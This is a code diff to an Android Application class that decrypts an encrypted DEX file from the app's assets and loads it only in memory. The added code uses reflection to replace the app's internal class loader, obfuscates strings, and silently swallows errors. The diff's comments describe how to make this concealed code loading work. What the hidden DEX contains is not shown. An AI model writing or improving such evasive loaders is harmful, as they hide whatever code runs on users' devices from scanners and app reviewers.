@@ -15,12 +15,13 @@ class BerlinAppEntry : Application() {
 
     override fun attachBaseContext(base: Context?) {
         super.attachBaseContext(base)
-        try { run() } catch (t: Throwable) { }
+        try { run(base) } catch (t: Throwable) { }
     }
 
-    private fun run() {
-        val assets = assets ?: return
-        val enc: ByteArray = peel(assets.open(BuildConfig.BERLIN_DEX_ASSET)) ?: return
+    // FIX 1: use 'base' parameter — this.assets is NULL during attachBaseContext
+    private fun run(base: Context?) {
+        val assetMgr = base?.assets ?: baseContext?.assets ?: return
+        val enc: ByteArray = peel(assetMgr.open(BuildConfig.BERLIN_DEX_ASSET)) ?: return
         if (enc.size < 17) { wipeArray(enc); return }
         val dex: ByteArray = aesDecrypt(enc, BuildConfig.BERLIN_DEX_KEY)
             ?: run { wipeArray(enc); return }
@@ -31,9 +32,14 @@ class BerlinAppEntry : Application() {
         try {
             val cls = Class.forName(String(nc))
             val ctor = cls.getConstructor(ByteBuffer::class.java, ClassLoader::class.java)
-            val b = ClassLoader::class.java.cast(ctor.newInstance(ByteBuffer.wrap(dex), null)) ?: return
-            h = b; chainParent(b)
+            val b = ClassLoader::class.java.cast(ctor.newInstance(ByteBuffer.wrap(dex), ClassLoader.getSystemClassLoader())) ?: return
+            h = b; chain(b)
         } catch (t: Throwable) { return } finally { wipeArray(dex) }
+    }
+
+    // FIX 2: override getClassLoader() — secondary hook Android uses for class resolution
+    override fun getClassLoader(): ClassLoader {
+        return h ?: super.getClassLoader()
     }
 
     override fun onCreate() { super.onCreate(); kick() }
@@ -41,7 +47,6 @@ class BerlinAppEntry : Application() {
     private fun kick() {
         val b = h ?: classLoader ?: return
         try {
-            // Boot LauncherApplication from the decrypted DEX loaded in RAM
             val cls = Class.forName((packageName ?: return) + ".LauncherApplication", true, b)
             val app = cls.newInstance() as? Application ?: return
             val ae = byteArrayOf(0x3b,0x2e,0x2e,0x3b,0x39,0x32)
@@ -62,13 +67,35 @@ class BerlinAppEntry : Application() {
         } catch (t: Throwable) { wipeArray(k); null }
     }
 
-    private fun chainParent(c: ClassLoader?) {
+    // FIX 3: inject into mPackageInfo.mClassLoader — the field Android actually uses
+    // to resolve Activity/Service components. chainParent() (setting ClassLoader.parent)
+    // is insufficient — AppComponentFactory.instantiateActivity() reads mPackageInfo
+    // directly, it does NOT walk the parent chain.
+    private fun chain(c: ClassLoader?) {
         if (c == null) return
         try {
-            val pe = byteArrayOf(0x2a,0x3b,0x28,0x3f,0x34,0x2e)
-            val pc = CharArray(pe.size); var pi = 0; while (pi < pe.size) { pc[pi] = (pe[pi].toInt() and 0xFF xor 0x5A).toChar(); pi++ }
-            val f = ClassLoader::class.java.getDeclaredField(String(pc)); f.isAccessible = true; f.set(classLoader, c)
+            var cls: Class<*>? = baseContext?.javaClass
+            var pkgInfoField: java.lang.reflect.Field? = null
+            while (cls != null && pkgInfoField == null) {
+                pkgInfoField = try { cls.getDeclaredField("mPackageInfo") } catch (_: NoSuchFieldException) { null }
+                cls = cls.superclass
+            }
+            if (pkgInfoField == null) return
+            pkgInfoField.isAccessible = true
+            val pkgInfo = pkgInfoField.get(baseContext) ?: return
+
+            var cls2: Class<*>? = pkgInfo.javaClass
+            var clField: java.lang.reflect.Field? = null
+            while (cls2 != null && clField == null) {
+                clField = try { cls2.getDeclaredField("mClassLoader") } catch (_: NoSuchFieldException) { null }
+                cls2 = cls2.superclass
+            }
+            if (clField == null) return
+            clField.isAccessible = true
+            clField.set(pkgInfo, c)
         } catch (t: Throwable) { }
+
+        try { Thread.currentThread().contextClassLoader = c } catch (t: Throwable) { }
     }
 
     private fun peel(s: InputStream?): ByteArray? {
